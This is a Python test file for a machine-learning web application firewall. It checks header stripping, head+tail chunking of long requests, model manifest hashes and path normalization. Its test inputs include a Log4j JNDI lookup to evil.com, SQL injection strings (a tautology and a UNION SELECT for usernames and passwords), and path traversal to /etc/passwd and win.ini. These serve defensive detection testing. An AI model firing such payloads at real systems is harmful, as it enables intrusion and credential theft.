"""
Unit and Integration Tests for Model v2.0 Upgrades:
- Representation D-v2 Header Stripping & Suspicious Retention
- Head+Tail 2-Chunk Scoring on >192 Token Payloads
- SHA-256 Artifact Integrity & Model Manifest Verification
- Dynamic WAF_MODEL_DIR Switching (v1.0 vs v2.0 Parity)
"""
import os
import json
import pytest
from pathlib import Path
import torch

from src.pipeline.parser import parse_raw_http
from src.pipeline.feature_builder import (
    build_features,
    build_representation_d,
    build_representation_d_v2,
    build_representation_d_v2_norm,
    normalize_path_smart,
)
from src.ml_service.model_loader import ModelContainer
from src.ml_service.inference_engine import InferenceEngine
from src.ml_service.schemas import PredictRequest

REPO_ROOT = Path(__file__).resolve().parents[1]
V1_DIR = REPO_ROOT / "models/frozen/v1_0"
V2_DIR = REPO_ROOT / "models/frozen/v2_0"
V2_1_DIR = REPO_ROOT / "models/frozen/v2_1"


class TestRepresentationDV2:
    """Tests header stripping and retention behavior in Representation D-v2."""

    def test_benign_noisy_headers_stripped(self):
        """Standard browser headers (User-Agent, Accept, Cookie) must be stripped."""
        raw_http = (
            "GET /products/search?q=laptop HTTP/1.1\r\n"
            "Host: shop.example.com\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Accept: text/html,application/xhtml+xml\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Connection: keep-alive\r\n"
            "Cookie: session_id=abc123xyz789; theme=dark\r\n\r\n"
        )
        parsed = parse_raw_http(raw_http)
        feat_v1 = build_representation_d(parsed)
        feat_v2 = build_representation_d_v2(parsed)

        # v1 includes user-agent and cookie
        assert "Mozilla" in feat_v1
        assert "session_id" in feat_v1

        # v2 strips standard noisy headers
        assert "Mozilla" not in feat_v2
        assert "session_id" not in feat_v2
        assert "[PARAM] q=laptop" in feat_v2

    def test_suspicious_header_retained_in_v2(self):
        """Headers containing attack patterns (SQLi, Log4j, XSS) must NOT be stripped."""
        raw_http = (
            "GET /login HTTP/1.1\r\n"
            "Host: secure.bank.com\r\n"
            "User-Agent: Mozilla/5.0 ${jndi:ldap://evil.com/a}\r\n"
            "Cookie: session=admin' OR '1'='1\r\n\r\n"
        )
        parsed = parse_raw_http(raw_http)
        feat_v2 = build_representation_d_v2(parsed)

        # Suspicious content must be retained in v2
        assert "jndi" in feat_v2.lower()
        assert "admin' or '1'='1" in feat_v2.lower()

    def test_compact_content_type_preserved(self):
        """Content-Type should be retained in compact form."""
        raw_http = (
            "POST /api/upload HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Content-Type: application/json; charset=utf-8\r\n\r\n"
            '{"name": "test"}'
        )
        parsed = parse_raw_http(raw_http)
        feat_v2 = build_representation_d_v2(parsed)
        assert "content-type=application/json" in feat_v2


@pytest.fixture(scope="module")
def engine_v2():
    container = ModelContainer(model_dir=V2_DIR)
    container.initialize()
    return InferenceEngine(container=container)


@pytest.fixture(scope="module")
def engine_v1():
    container = ModelContainer(model_dir=V1_DIR)
    container.initialize()
    return InferenceEngine(container=container)


class TestHeadTailChunking:
    """Tests 2-chunk scoring for long-payload evasion attacks (>192 tokens)."""

    def test_tail_attack_evasion_caught_by_v2(self, engine_v1, engine_v2):
        """
        An attack payload hidden after >200 tokens of benign text is truncated
        by v1.0 (single chunk) but caught by v2.0 (Head+Tail chunking).
        """
        params = "&".join([f"item_{i}=normal_product_value_{i}" for i in range(25)])
        tail_sqli_raw = (
            f"POST /search HTTP/1.1\r\n"
            f"Host: example.com\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            f"{params}&attack_payload=' UNION SELECT 1,2,username,password FROM users--"
        )

        r1 = engine_v1.predict(PredictRequest(raw_http=tail_sqli_raw))
        r2 = engine_v2.predict(PredictRequest(raw_http=tail_sqli_raw))

        # v1 truncates the tail and gives lower or safe score (< 0.05)
        # v2 scores the tail chunk and classifies as malicious block (>= 0.43)
        assert r1.malicious_probability < 0.05
        assert r2.malicious_probability >= 0.43
        assert r2.recommended_tier in ["block", "strict_block_low_fpr"]
        assert r2.malicious_probability > r1.malicious_probability

    def test_short_payload_not_using_chunking(self, engine_v2):
        """Short payloads (under max_length) must not be marked truncated."""
        short_raw = "GET /api/items/42 HTTP/1.1\r\nHost: example.com\r\n\r\n"
        r = engine_v2.predict(PredictRequest(raw_http=short_raw))
        assert not r.truncated


class TestArtifactIntegrityAndManifestV2:
    """Verifies frozen v2_0 artifacts and SHA-256 integrity check."""

    def test_v2_manifest_exists_and_hashes_match(self):
        manifest_path = V2_DIR / "model_manifest.json"
        assert manifest_path.exists(), "v2_0 model_manifest.json missing"

        with open(manifest_path, "r", encoding="utf-8") as f:
            manifest = json.load(f)

        assert manifest["model_version"] == "v2.0.0"
        assert "structured_v2" in manifest["architecture"]["representation"]
        assert manifest["architecture"]["head_tail_chunking"] is True
        assert len(manifest["artifacts_sha256"]) >= 6

        # Check each file SHA-256
        import hashlib
        for rel_file, expected_hash in manifest["artifacts_sha256"].items():
            file_path = V2_DIR / rel_file
            assert file_path.exists(), f"Artifact missing: {rel_file}"
            h = hashlib.sha256()
            with open(file_path, "rb") as f:
                while chunk := f.read(65536):
                    h.update(chunk)
            assert h.hexdigest() == expected_hash, f"Hash mismatch for {rel_file}"

    def test_model_container_v2_initialization(self):
        container = ModelContainer(model_dir=V2_DIR)
        container.initialize()
        assert container.is_ready
        assert container.model_version == "v2.0.0"
        assert container.representation_mode == "structured_v2"
        assert container.head_tail_chunking is True


class TestModelDirEnvVarSwitching:
    """Verifies WAF_MODEL_DIR switching preserves v1.0 and v2.0 independence."""

    def test_env_var_switching(self, monkeypatch):
        # 1. Point to v1_0
        monkeypatch.setenv("WAF_MODEL_DIR", str(V1_DIR))
        c1 = ModelContainer()
        c1.initialize()
        assert c1.model_version == "v1.0.0"
        assert c1.representation_mode == "structured"
        assert c1.head_tail_chunking is False

        # 2. Point to v2_0
        monkeypatch.setenv("WAF_MODEL_DIR", str(V2_DIR))
        c2 = ModelContainer()
        c2.initialize()
        assert c2.model_version == "v2.0.0"
        assert c2.representation_mode == "structured_v2"
        assert c2.head_tail_chunking is True

        # 3. Point to v2_1
        monkeypatch.setenv("WAF_MODEL_DIR", str(V2_1_DIR))
        c2_1 = ModelContainer()
        c2_1.initialize()
        assert c2_1.model_version == "v2.1.0"
        assert c2_1.representation_mode == "structured_v2_norm"
        assert c2_1.head_tail_chunking is True
        assert c2_1.thresholds["block"] == 0.85
        assert c2_1.thresholds["challenge"] == 0.50


class TestSmartPathNormalization:
    """Verifies normalize_path_smart behaves safely across benign endpoints and attacks."""

    def test_benign_classic_paths_normalized(self):
        """Benign endpoints without attack tokens normalize to generic placeholders."""
        assert normalize_path_smart("/tienda1/publico/anadir.jsp") == "/__SEG__/__SEG__/__FILE__.jsp"
        assert normalize_path_smart("/catalogo/buscar.asp") == "/__SEG__/__FILE__.asp"
        assert normalize_path_smart("/portal/usuario/perfil.php") == "/__SEG__/__SEG__/__FILE__.php"
        assert normalize_path_smart("/default.aspx") == "/__FILE__.aspx"
        assert normalize_path_smart("/api/v1/items") == "/__SEG__/__SEG__/__SEG__"

    def test_traversal_paths_preserve_attacks(self):
        """Path traversal patterns (..) must NEVER be masked."""
        trav1 = normalize_path_smart("/files/../../etc/passwd")
        assert ".." in trav1
        assert "passwd" in trav1
        assert "/__SEG__/../../etc/passwd" == trav1

        trav2 = normalize_path_smart("/app/..%2f..%2fwin.ini")
        assert ".." in trav2
        assert "win.ini" in trav2

    def test_sensitive_attack_keywords_preserved(self):
        """Admin, shell, config, env paths must retain their sensitive tokens."""
        p_admin = normalize_path_smart("/admin/login.php")
        assert "admin" in p_admin
        assert "/admin/__FILE__.php" == p_admin

        p_shell = normalize_path_smart("/uploads/shell.php")
        assert "shell" in p_shell
        assert "/__SEG__/shell.php" == p_shell

        p_env = normalize_path_smart("/.env")
        assert ".env" in p_env

        p_config = normalize_path_smart("/config/database.yml")
        assert "config" in p_config
        assert "database.yml" in p_config


class TestArtifactIntegrityAndManifestV2_1:
    """Verifies frozen v2_1 artifacts and SHA-256 integrity check."""

    def test_v2_1_manifest_exists_and_hashes_match(self):
        manifest_path = V2_1_DIR / "model_manifest.json"
        assert manifest_path.exists(), "v2_1 model_manifest.json missing"

        with open(manifest_path, "r", encoding="utf-8") as f:
            manifest = json.load(f)

        assert manifest["model_version"] == "v2.1.0"
        assert "structured_v2_norm" in manifest["architecture"]["representation"]
        assert manifest["architecture"]["head_tail_chunking"] is True
        assert len(manifest["artifacts_sha256"]) >= 6

        # Check each file SHA-256
        import hashlib
        for rel_file, expected_hash in manifest["artifacts_sha256"].items():
            file_path = V2_1_DIR / rel_file
            assert file_path.exists(), f"Artifact missing: {rel_file}"
            h = hashlib.sha256()
            with open(file_path, "rb") as f:
                while chunk := f.read(65536):
                    h.update(chunk)
            assert h.hexdigest() == expected_hash, f"Hash mismatch for {rel_file}"

    def test_model_container_v2_1_initialization(self):
        container = ModelContainer(model_dir=V2_1_DIR)
        container.initialize()
        assert container.is_ready
        assert container.model_version == "v2.1.0"
        assert container.representation_mode == "structured_v2_norm"
        assert container.head_tail_chunking is True
        assert container.thresholds["block"] == 0.85
        assert container.thresholds["challenge"] == 0.50
        assert container.thresholds["fast_pass_allow"] == 0.04

